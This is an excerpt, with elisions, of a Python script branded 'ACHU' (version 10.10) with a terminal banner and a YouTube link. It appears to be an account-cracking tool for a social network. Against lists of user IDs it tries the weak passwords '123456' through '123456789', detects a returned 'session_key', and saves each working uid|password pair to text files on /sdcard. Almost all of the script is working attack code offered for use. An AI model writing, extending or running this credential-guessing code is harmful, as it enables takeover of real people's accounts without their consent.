...
yt_link = "https://youtube.com/@gigglenest-c4f?si=r9JnHnQRdeDMU741"
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【A C H U 👑 】𓆪 \x07')
...
def show_branding():
  ...
  / _ \| |   | |_| | | | |
 / ___ \ |___|  _  | |_| |
/_/   \_\____|_| |_|\___/\033[0m""")
               
    # 2. پھر اس کے بالکل نیچے آپ کا کلر فل لائنز والا ڈیٹا شو ہوگا
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mAchu")
    ...
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m10.10")
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/Achu-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/Achu-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
